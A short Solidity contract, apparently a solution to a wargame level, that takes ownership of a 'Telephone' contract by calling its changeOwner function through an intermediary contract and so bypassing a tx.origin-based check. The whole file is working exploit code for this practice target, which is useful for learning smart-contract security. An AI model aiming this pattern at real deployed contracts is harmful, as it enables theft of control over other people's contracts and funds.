// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Telephone.sol";

contract Hack{

   Telephone public immutable target;
   constructor(address _target) {
        target = Telephone(_target);
   }
    function change() public {
        target.changeOwner(address(this));
    }
}